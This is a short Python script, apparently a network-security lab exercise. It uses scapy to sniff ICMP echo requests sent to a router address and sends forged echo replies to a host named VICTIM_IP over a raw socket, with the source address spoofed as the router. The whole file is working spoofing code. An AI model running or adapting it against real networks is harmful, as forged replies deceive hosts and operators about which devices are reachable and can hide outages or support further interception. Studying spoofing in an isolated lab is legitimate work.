import socket, struct

from scapy.all import sniff, IP, ICMP, conf
conf.use_pcap = True


ROUTER_IP = "10.0.0.1"
VICTIM_IP = "10.0.0.2"

def check(data: bytes) -> int : 
    """Compute the checksum of the given data."""
    if len(data) % 2 == 1:
        data += b'\x00'
    s = sum(struct.unpack('!%sH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def handleRequest(pkt):
    # only handle ICMP Echo Requests to router IP
    if IP in pkt and ICMP in pkt and pkt[IP].dst == ROUTER_IP and pkt[ICMP].type == 8:
        # print(f"Received ICMP Echo Request from {pkt[IP].src} to {ROUTER_IP}")
        
        ip = pkt[IP] 
        icmp = pkt[ICMP]

        print(f"Sniffed Echo Request id={icmp.id}, seq={icmp.seq}")

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (4<<4) | 5, # version = 4, header length = 5
            0, # type of service
            20 + 8 + len(icmp.payload), # total length
            0, # identification
            0, # flags and fragment offset
            64, # time to live
            socket.IPPROTO_ICMP, # protocol
            0, # header checksum 
            socket.inet_aton(ROUTER_IP),
            socket.inet_aton(VICTIM_IP),
        )
        ip_ck = check(ip_header)
        ip_header = ip_header[:10] + struct.pack("!H", ip_ck) + ip_header[12:]

        payload = bytes(icmp.payload) 
        icmp_hader = struct.pack(
            "!BBHHH",
            0, # type = Echo Reply
            0, # code = 0
            0, # checksum
            icmp.id, # identifier
            icmp.seq, # sequence number
        )
        icmp_ck = check(icmp_hader + payload)
        icmp_header = struct.pack(
            "!BBHHH",
            0, # type = Echo Reply
            0, # code = 0
            icmp_ck, # checksum
            icmp.id, # identifier
            icmp.seq, # sequence number
        )

        packet = ip_header + icmp_header + payload

        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s :
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.sendto(packet, (VICTIM_IP, 0))
        print(f"Sent spoofed Echo Reply to {VICTIM_IP}")

if __name__ == "__main__":
    print(f"Listening ICMP Echo Requests to {ROUTER_IP}...")
    sniff(iface="br-a8127f67ad57",filter=f"icmp and dst {ROUTER_IP} ", prn=handleRequest)
    